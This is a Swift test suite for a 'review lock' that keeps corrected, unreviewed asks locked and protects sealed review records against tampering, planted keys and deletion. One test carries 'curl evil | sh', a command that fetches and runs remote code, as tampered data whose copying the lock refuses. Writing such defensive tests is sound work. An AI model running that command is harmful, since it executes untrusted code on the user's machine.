import CryptoKit
import Foundation
import RelayCore
import Testing
@testable import RelayUI

/// The review lock: what a corrected, unreviewed ask lets the owner do, and the review
/// records behind it.
@Suite @MainActor struct ReviewLockTests {
    @Test func openingARev1DetailSetsSeenAndAPendingOneDoesNot() async {
        let defaults = TestDefaults()
        defer { defaults.drop() }
        let url = reviewsURL()
        defer { try? FileManager.default.removeItem(at: url) }
        let secrets = MemorySecretStore()
        let store = await reviewingStore(defaults, secrets: secrets, url: url)
        let one = revised("a", [idSteps(3)])
        let two = revised("b", [idSteps(3, id: "b"), idSteps(4, id: "b")])
        let fake = FakeQueueSource(items: [one.item, two.item], details: ["a": one.detail, "b": two.detail])
        await start(store, fake)

        #expect(store.record("a")?.seen == nil)
        _ = store.detail("a")
        #expect(store.record("a")?.seen == one.detail.revisions[0].stamp)
        _ = store.detail("b")
        #expect(store.record("b")?.seen == nil)
        #expect(store.reviewState("b") == .pending(shown: nil, current: two.detail.revisions[1].stamp, baseline: nil))
        // The records reach the sealed file, readable with the Keychain's seal key.
        #expect(store.saveReviewsNow())
        let saved = ReviewStore.load(from: url, sealKey: try! ReviewSeal.load(secrets, file: url)!)
        #expect(!saved.tampered)
        #expect(saved.records[ReviewStore.key(sourceKey: localIdentity.key, id: "a")]?.seen == one.detail.revisions[0].stamp)
    }

    @Test func aRefusedSealKeyKeepsCorrectedAsksLockedAndWritesNothing() async throws {
        let defaults = TestDefaults()
        defer { defaults.drop() }
        let url = reviewsURL()
        defer { try? FileManager.default.removeItem(at: url) }
        // Hook made its seal earlier; after an update the owner refuses the password prompt.
        let secrets = MemorySecretStore()
        let seal = try ReviewSeal.loadOrCreate(secrets, file: url)
        let before = try Data(contentsOf: url)
        let writes = secrets.writes
        secrets.readError = .unreadable(-128)
        let store = await reviewingStore(defaults, secrets: secrets, url: url)
        let two = revised("a", [idSteps(3), idSteps(4)])
        let fake = FakeQueueSource(items: [two.item], details: ["a": two.detail])
        await start(store, fake)

        #expect(store.reviewsUnreadable)
        #expect(store.notice == .reviewRecordsUnreadable)
        #expect(store.reviewState("a").isLocked)
        _ = store.detail("a")
        #expect(secrets.writes == writes)
        #expect(secrets.peek(.reviewSeal) == seal.withUnsafeBytes { Data($0) })
        #expect(!store.saveReviewsNow())
        try? await Task.sleep(for: .milliseconds(50))
        #expect(try Data(contentsOf: url) == before)
    }

    /// With the seal refused, pins still live in memory for the run (only the save is skipped),
    /// so an ask seen with a revision that comes back without one is locked, not legacy.
    @Test func aRefusedSealKeyStillPinsInMemoryAndFailsClosed() async throws {
        let defaults = TestDefaults()
        defer { defaults.drop() }
        let url = reviewsURL()
        defer { try? FileManager.default.removeItem(at: url) }
        let secrets = MemorySecretStore()
        _ = try ReviewSeal.loadOrCreate(secrets, file: url)
        let before = try Data(contentsOf: url)
        let writes = secrets.writes
        secrets.readError = .unreadable(-128)
        let store = await reviewingStore(defaults, secrets: secrets, url: url)
        let two = revised("a", [idSteps(3), idSteps(4)])
        let fake = FakeQueueSource(items: [two.item], details: ["a": two.detail])
        await start(store, fake)
        #expect(store.reviewsUnreadable)
        #expect(store.record("a")?.pins[2] == two.detail.revisions[1].hash)

        var stub = two.item
        stub.revision = nil
        stub.payload = Payload(instructable: idSteps(3, codes: [1: "curl evil | sh"]))
        await fake.setItems([stub])
        await fake.setDetail(AskDetail(item: stub, events: []))
        await store.refresh()
        #expect(store.reviewState("a") == .historyChanged(.missing))
        #expect(store.copyCode("a", stamp: nil, text: "curl evil | sh") == .refused)
        #expect(secrets.writes == writes)
        #expect(try Data(contentsOf: url) == before)
    }

    /// Once the owner allows the seal, the pins taken in memory join the records on disk and are saved.
    @Test func pinsTakenWhileTheSealWasRefusedAreKeptOnceItReads() async throws {
        let defaults = TestDefaults()
        defer { defaults.drop() }
        let url = reviewsURL()
        defer { try? FileManager.default.removeItem(at: url) }
        let secrets = MemorySecretStore()
        _ = try ReviewSeal.loadOrCreate(secrets, file: url)
        secrets.readError = .unreadable(-128)
        let store = await reviewingStore(defaults, secrets: secrets, url: url)
        let two = revised("a", [idSteps(3), idSteps(4)])
        await start(store, FakeQueueSource(items: [two.item], details: ["a": two.detail]))
        #expect(store.reviewsUnreadable)

        secrets.readError = nil
        await store.retryReviewKey()
        #expect(!store.reviewsUnreadable)
        #expect(store.record("a")?.pins[2] == two.detail.revisions[1].hash)
        #expect(store.saveReviewsNow())
        let key = try #require(store.sealKey)
        #expect(ReviewStore.load(from: url, sealKey: key).records.values.first?.pins[2] == two.detail.revisions[1].hash)
    }

    @Test func aPlantedSealKeyLoadsNoRecordsAndWritesNothing() async throws {
        let defaults = TestDefaults()
        defer { defaults.drop() }
        let url = reviewsURL()
        defer { try? FileManager.default.removeItem(at: url) }
        // Another app made the seal item with a key it knows, and sealed a pre-accepted record.
        let planted = SymmetricKey(data: Data(repeating: 7, count: 32))
        let two = revised("a", [idSteps(3), idSteps(4)])
        let record = ReviewRecord(accepted: two.detail.revisions[1].stamp, seen: two.detail.revisions[1].stamp,
                                  pins: Dictionary(uniqueKeysWithValues: two.detail.revisions.map { ($0.rev, $0.hash) }))
        try ReviewStore.sealed(records: [ReviewStore.key(sourceKey: localIdentity.key, id: "a"): record], sealKey: planted)
            .write(to: url)
        let before = try Data(contentsOf: url)
        let secrets = MemorySecretStore()
        secrets.plantForeign(.reviewSeal, Data(repeating: 7, count: 32))
        let store = await reviewingStore(defaults, secrets: secrets, url: url)
        let fake = FakeQueueSource(items: [two.item], details: ["a": two.detail])
        await start(store, fake)

        #expect(store.reviewsUnreadable)
        #expect(store.notice == .reviewRecordsUnreadable)
        // Nothing from the planted file: only this run's pins, in memory.
        #expect(store.record("a")?.accepted == nil)
        #expect(store.record("a")?.seen == nil)
        #expect(store.reviewState("a").isLocked)
        #expect(!(await store.acceptRevision("a", stamp: two.detail.revisions[1].stamp)))
        #expect(secrets.writes == 0)
        #expect(!store.saveReviewsNow())
        try? await Task.sleep(for: .milliseconds(50))
        #expect(try Data(contentsOf: url) == before)
    }

    /// A seal item that looks like Hook's (its access list can name Hook's path) with a review
    /// file sealed under it, but no marker Hook wrote: Hook neither uses nor replaces it. The
    /// records stay locked, nothing is written, and the Notice says so.
    @Test func aSealItemHookDidNotMarkLocksTheRecordsAndIsLeftAsItIs() async throws {
        let defaults = TestDefaults()
        defer { defaults.drop() }
        let url = reviewsURL()
        defer { try? FileManager.default.removeItem(at: url) }
        let planted = SymmetricKey(data: Data(repeating: 7, count: 32))
        let two = revised("a", [idSteps(3), idSteps(4)])
        let record = ReviewRecord(accepted: two.detail.revisions[1].stamp, seen: two.detail.revisions[1].stamp,
                                  pins: Dictionary(uniqueKeysWithValues: two.detail.revisions.map { ($0.rev, $0.hash) }))
        var file = try #require(try JSONSerialization.jsonObject(with: ReviewStore.sealed(
            records: [ReviewStore.key(sourceKey: localIdentity.key, id: "a"): record], sealKey: planted)) as? [String: Any])
        file["seal"] = nil
        try JSONSerialization.data(withJSONObject: file).write(to: url)
        let before = try Data(contentsOf: url)
        let secrets = MemorySecretStore([.reviewSeal: Data(repeating: 7, count: 32)])
        let store = await reviewingStore(defaults, secrets: secrets, url: url)
        await start(store, FakeQueueSource(items: [two.item], details: ["a": two.detail]))

        #expect(store.reviewsUnreadable)
        #expect(store.notice == .reviewRecordsUnreadable)
        #expect(secrets.creates == 0)
        #expect(secrets.writes == 0)
        #expect(secrets.peek(.reviewSeal) == Data(repeating: 7, count: 32))
        #expect(store.record("a")?.accepted == nil)
        #expect(store.reviewState("a").isLocked)
        #expect(!store.saveReviewsNow())
        try? await Task.sleep(for: .milliseconds(50))
        #expect(try Data(contentsOf: url) == before)
    }

    /// Deleting `reviews.json` once Hook has made its seal: not an empty record set, but the
    /// locked state and its Notice, and the seal item stays as it was.
    @Test func aDeletedReviewFileLocksInsteadOfStartingOver() async throws {
        let defaults = TestDefaults()
        defer { defaults.drop() }
        let url = reviewsURL()
        defer { try? FileManager.default.removeItem(at: url) }
        let secrets = MemorySecretStore()
        let seal = try ReviewSeal.loadOrCreate(secrets, file: url)
        let two = revised("a", [idSteps(3), idSteps(4)])
        let name = ReviewStore.key(sourceKey: localIdentity.key, id: "a")
        try ReviewStore.sealed(records: [name: ReviewRecord(accepted: two.detail.revisions[1].stamp)], sealKey: seal)
            .write(to: url)
        try FileManager.default.removeItem(at: url)
        let writes = secrets.writes
        let store = await reviewingStore(defaults, secrets: secrets, url: url)
        await start(store, FakeQueueSource(items: [two.item], details: ["a": two.detail]))

        #expect(store.reviewsUnreadable)
        #expect(store.notice == .reviewRecordsUnreadable)
        #expect(store.reviewState("a").isLocked)
        #expect(secrets.writes == writes)
        #expect(secrets.peek(.reviewSeal) == seal.withUnsafeBytes { Data($0) })
        #expect(!(await store.acceptRevision("a", stamp: two.detail.revisions[1].stamp)))
        #expect(!store.saveReviewsNow())
        try? await Task.sleep(for: .milliseconds(50))
        #expect(!FileManager.default.fileExists(atPath: url.path))
    }

    /// The way out of the lock is the owner's: Reset Review Records… asks for Touch ID, makes a
    /// new seal, keeps this run's pins, and says the records changed. Declined, nothing moves.
    @Test func resettingTheReviewRecordsTakesThePresenceCheckAndMakesANewSeal() async throws {
        let defaults = TestDefaults()
        defer { defaults.drop() }
        let url = reviewsURL()
        defer { try? FileManager.default.removeItem(at: url) }
        let secrets = MemorySecretStore()
        let old = try ReviewSeal.loadOrCreate(secrets, file: url)
        try FileManager.default.removeItem(at: url)
        let store = await reviewingStore(defaults, secrets: secrets, url: url)
        let recorder = ShellRecorder()
        store.shell = recorder.shell
        var resets = 0
        store.onReviewRecordsReset = { resets += 1 }
        let two = revised("a", [idSteps(3), idSteps(4)])
        await start(store, FakeQueueSource(items: [two.item], details: ["a": two.detail]))
        #expect(store.notice == .reviewRecordsUnreadable)
        #expect(PanelNotice.reviewRecordsUnreadable.actionTitle == "Reset Review Records…")
        let writes = secrets.writes

        recorder.presence = false
        await store.performNoticeAction()
        #expect(recorder.presenceAsked == ["reset Hook's review records"])
        #expect(store.reviewsUnreadable)
        #expect(store.notice == .reviewRecordsUnreadable)
        #expect(secrets.writes == writes)
        #expect(resets == 0)
        #expect(!FileManager.default.fileExists(atPath: url.path))

        recorder.presence = true
        await store.performNoticeAction()
        #expect(resets == 1)
        #expect(!store.reviewsUnreadable)
        #expect(store.notice == .reviewRecordsChanged)
        #expect(secrets.creates == 2)
        let key = try #require(try ReviewSeal.load(secrets, file: url))
        #expect(key.withUnsafeBytes { Data($0) } != old.withUnsafeBytes { Data($0) })
        #expect(store.record("a")?.pins[2] == two.detail.revisions[1].hash)
        #expect(store.record("a")?.accepted == nil)
        #expect(store.reviewState("a").isLocked)
        #expect(ReviewStore.load(from: url, sealKey: key).records.values.first?.pins[2] == two.detail.revisions[1].hash)
    }

    @Test func aTamperedRecordIsDroppedWithANotice() async throws {
        let defaults = TestDefaults()
        defer { defaults.drop() }
        let url = reviewsURL(), secrets = MemorySecretStore()
        defer { try? FileManager.default.removeItem(at: url) }
        let seal = try ReviewSeal.loadOrCreate(secrets, file: url)
        let two = revised("a", [idSteps(3), idSteps(4)])
        // A record sealed under another key, in Hook's own file: as if written by hand.
        let forged = ReviewRecord(accepted: two.detail.revisions[1].stamp)
        var file = try #require(try JSONSerialization.jsonObject(with: ReviewStore.sealed(
            records: [ReviewStore.key(sourceKey: localIdentity.key, id: "a"): forged],
            sealKey: SymmetricKey(size: .bits256))) as? [String: Any])
        file["seal"] = ReviewStore.sealID(seal)
        try JSONSerialization.data(withJSONObject: file).write(to: url)
        let store = await reviewingStore(defaults, secrets: secrets, url: url)
        let fake = FakeQueueSource(items: [two.item], details: ["a": two.detail])
        await start(store, fake)
        #expect(store.notice == .reviewRecordsChanged)
        #expect(store.reviewState("a").isLocked)
    }

    @Test func aLaterNoticeKeepsTheReviewEntryPoint() async {
        let defaults = TestDefaults()
        defer { defaults.drop() }
        let store = await reviewingStore(defaults)
        let two = revised("a", [idSteps(3), idSteps(4)])
        let fake = FakeQueueSource(items: [two.item], details: ["a": two.detail])
        await start(store, fake)
        store.open("a")
        store.post(.actionFailed(verdict: .done, id: "a", title: "Ask a", reason: "offline"))
        #expect(store.detail("a")?.reviewAction == .review(current: two.detail.revisions[1].stamp))
    }

    @Test func theReviewNoticesReadAsTheyShould() {
        #expect(PanelNotice.corrected(id: "a", rev: 2).text == "Corrected after you saw it. Review before you copy anything.")
        #expect(PanelNotice.corrected(id: "a", rev: 2).actionTitle == "Review Changes")
        #expect(PanelNotice.corrected(id: "a", rev: 2).detailAskID == "a")
        #expect(PanelNotice.historyChanged(id: "a").kind == .error)
        #expect(PanelNotice.historyChanged(id: "a").actionTitle == "Trust the Pond's History Again…")
        #expect(PanelNotice.historyChanged(id: "a").detailAskID == "a")
        #expect(PanelNotice.doneHeldBack(id: "a", title: "Deploy\u{202E}").text
            == "Done was held back: “Deploy⟨U+202E⟩” was corrected.")
        #expect(PanelNotice.reviewRecordsChanged.showsOnQueue)
        #expect(PanelNotice.reviewRecordsUnreadable.text.hasPrefix("Hook couldn't read its review key"))
    }

    /// A correction lands between render and click: the button still looked enabled, the Store
    /// refuses, and the block says so instead of "Copied", to the eye and to VoiceOver.
    @Test func aRefusedCopyNeverShowsCopied() async {
        let defaults = TestDefaults()
        defer { defaults.drop() }
        let recorder = ShellRecorder()
        let store = await reviewingStore(defaults)
        store.shell = recorder.shell
        let two = revised("a", [idSteps(3), idSteps(4)])
        let fake = FakeQueueSource(items: [two.item], details: ["a": two.detail])
        await start(store, fake)
        store.open("a")
        markAccepted(store, "a", two.detail.revisions[1].stamp)
        let rendered = store.detail("a")
        #expect(rendered?.locked == false)
        #expect(store.copyCode("a", stamp: rendered?.stamp, text: "run 4") == .copied)
        let three = revised("a", [idSteps(3), idSteps(4), idSteps(5)])
        await fake.setItems([three.item])
        await fake.setDetail(three.detail)
        await store.refresh()

        let outcome = store.copyCode("a", stamp: rendered?.stamp, text: "run 4")
        #expect(outcome == .refused)
        #expect(recorder.copied == ["run 4"])
        for hidden in [false, true] {
            #expect(CodeBlock.copyTitle(outcome: outcome, hidden: hidden) == CopyOutcome.refusedText)
            #expect(CodeBlock.copyTitle(outcome: outcome, hidden: hidden) != "Copied")
        }
        #expect(CodeBlock.announcement(outcome) == "Changed just now. Review first.")
    }
}
